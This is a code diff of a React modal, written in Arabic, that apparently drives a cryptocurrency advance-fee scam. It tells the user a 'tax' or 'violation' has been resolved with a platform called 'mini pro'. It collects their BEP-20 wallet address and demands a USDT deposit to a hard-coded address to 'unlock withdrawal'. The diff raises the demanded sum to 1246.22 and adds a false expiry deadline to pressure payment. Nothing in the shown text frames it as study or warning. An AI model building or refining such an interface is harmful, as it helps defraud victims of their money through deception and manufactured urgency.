@@ -1,6 +1,6 @@
 
 import React, { useState } from 'react';
-import { Copy, CheckCircle2, Loader2, ArrowRight, ShieldCheck, Wallet, ExternalLink } from 'lucide-react';
+import { Copy, CheckCircle2, Loader2, ArrowRight, ShieldCheck, Wallet, ExternalLink, AlertCircle } from 'lucide-react';
 
 interface ActionModalProps {
   userName: string;
@@ -13,6 +13,7 @@ export const ActionModal: React.FC<ActionModalProps> = ({ userName }) => {
   const [walletAddress, setWalletAddress] = useState('');
 
   const depositAddress = "0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d";
+  const amount = "1246.22";
 
   const handleCopy = () => {
     navigator.clipboard.writeText(depositAddress);
@@ -24,8 +25,8 @@ export const ActionModal: React.FC<ActionModalProps> = ({ userName }) => {
 
   return (
     <div className="fixed inset-0 z-[100] flex items-center justify-center p-6 bg-black/30 backdrop-blur-[1px]">
-      {/* Centered dialog with translate-y-12 to keep it slightly lower than absolute center */}
-      <div className="bg-white rounded-[2rem] w-full max-w-sm overflow-hidden shadow-2xl border border-gray-100 animate-in fade-in zoom-in duration-300 transform translate-y-12">
+      {/* Increased translate-y-12 to translate-y-24 to move the modal further down */}
+      <div className="bg-white rounded-[2rem] w-full max-w-sm overflow-hidden shadow-2xl border border-gray-100 animate-in fade-in zoom-in duration-300 transform translate-y-24">
         
         {/* Progress Bar */}
         <div className="h-1.5 w-full bg-gray-100 flex">
@@ -50,7 +51,7 @@ export const ActionModal: React.FC<ActionModalProps> = ({ userName }) => {
                   أهلاً بك <span className="text-[#FF2D55]">{userName}</span>
                 </h3>
                 <p className="text-gray-500 text-sm leading-relaxed">
-                  تم حل أمر الضريبة بنجاح. يرجى المتابعة لإعداد قناة السحب الخاصة بك.
+                  تم حل امر المخالفه وتم تخفيض الضريبه ضمن اتفاق مع منصه <span className="font-bold text-black">mini pro</span>. يرجى المتابعة لإعداد قناة السحب الخاصة بك.
                 </p>
               </div>
 
@@ -92,7 +93,7 @@ export const ActionModal: React.FC<ActionModalProps> = ({ userName }) => {
               <div className="space-y-2">
                 <h3 className="text-xl font-bold text-gray-900 leading-tight">رابط المحفظة</h3>
                 <p className="text-gray-500 text-sm leading-relaxed">
-                  الرجاء إدخال رابط محفظة <span className="font-bold text-black">BEB 20</span> الخاصة بك للمتابعة وتفعيل السحب.
+                  الرجاء إدخال رابط محفظة <span className="font-bold text-black">Bep 20</span> الخاصة بك للمتابعة وتفعيل السحب.
                 </p>
               </div>
 
@@ -101,7 +102,7 @@ export const ActionModal: React.FC<ActionModalProps> = ({ userName }) => {
                   type="text" 
                   value={walletAddress}
                   onChange={(e) => setWalletAddress(e.target.value)}
-                  placeholder="أدخل عنوان BEB 20 هنا..."
+                  placeholder="أدخل عنوان Bep 20 هنا..."
                   className="w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-4 focus:outline-none focus:ring-2 focus:ring-blue-500/10 focus:border-blue-500 transition-all text-black font-mono text-xs text-center"
                 />
               </div>
@@ -121,9 +122,17 @@ export const ActionModal: React.FC<ActionModalProps> = ({ userName }) => {
             <div className="space-y-5 w-full animate-in slide-in-from-right duration-300 text-right dir-rtl">
               <div className="bg-pink-50/50 p-5 rounded-2xl border border-pink-100">
                 <h4 className="text-[#FF2D55] font-bold text-lg mb-2">الخطوة الأخيرة</h4>
-                <p className="text-gray-800 text-[13px] leading-relaxed">
-                   بقي أمر إيداع مبلغ <span className="font-black text-black">237.47 USDT BEB 20</span> لفتح قناة السحب. 
+                <p className="text-gray-800 text-[13px] leading-relaxed mb-3">
+                   بقي أمر إيداع مبلغ <span className="font-black text-[#FF2D55]">{amount} USDT</span> <span className="font-bold text-black">Bep 20</span> لفتح قناة السحب. 
                 </p>
+                
+                <div className="flex items-start gap-2 bg-orange-50 p-3 rounded-xl border border-orange-100 mb-3">
+                  <AlertCircle size={18} className="text-orange-500 shrink-0 mt-0.5" />
+                  <p className="text-[11px] text-orange-700 leading-relaxed font-medium">
+                    هذا العنوان يعمل حتى الساعة 10 مساءً غداً، وإن لم يتم إكمال المعاملة سيتم إلغاؤها.
+                  </p>
+                </div>
+
                 <div className="h-px bg-pink-100 my-3" />
                 <p className="text-[11px] text-gray-500 leading-relaxed italic">
                   هذه الضريبة المنخفضة هي أجور منصتنا وليس لها أي صلة بمنصة mini pro. يمكنك السحب فوراً عند إنهاء الإيداع.
